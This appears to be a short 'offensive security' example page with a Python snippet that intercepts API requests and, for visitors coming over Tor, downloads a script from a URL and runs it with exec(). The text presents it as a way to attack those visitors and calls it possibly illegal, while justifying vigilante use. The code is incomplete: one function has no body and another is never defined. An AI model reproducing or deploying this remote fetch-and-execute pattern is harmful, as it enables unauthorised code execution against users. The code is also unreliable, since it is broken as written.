# Feuerteufel Logic
###### RedTeam Script Examples (EDU) by Volkan Sah - simple codings for 'Offensive Security' (updated 3/2023)

DANGER!

A creative Python script that intercepts API requests and, when accessed through the Tor network, loads and runs an external script from a specified URL to Fuck them!
However, keep in mind that this is a highly risky and potentially illegal activity. Use at your own risk and only against crime and child abuse!
##Sorry cant explane all or you know what can be!

```python
import requests

def intercept_api_requests(request):
    if check_if_accessed_over_tor(request):
        external_script_url = "https://example.com/external_script.py"
        response = requests.get(external_script_url)
        if response.status_code == 200:
            exec(response.text)
        else:
            print("Failed to load the external script.")

def check_if_accessed_over_tor(request):
    # Implement your logic to detect if the request is coming from the Tor network
    # This might involve inspecting the request headers or analyzing network traffic
    # Be aware that attempting to bypass security measures is likely illegal and unethical

# Register the interceptor function to intercept API requests
register_interceptor(intercept_api_requests)
```
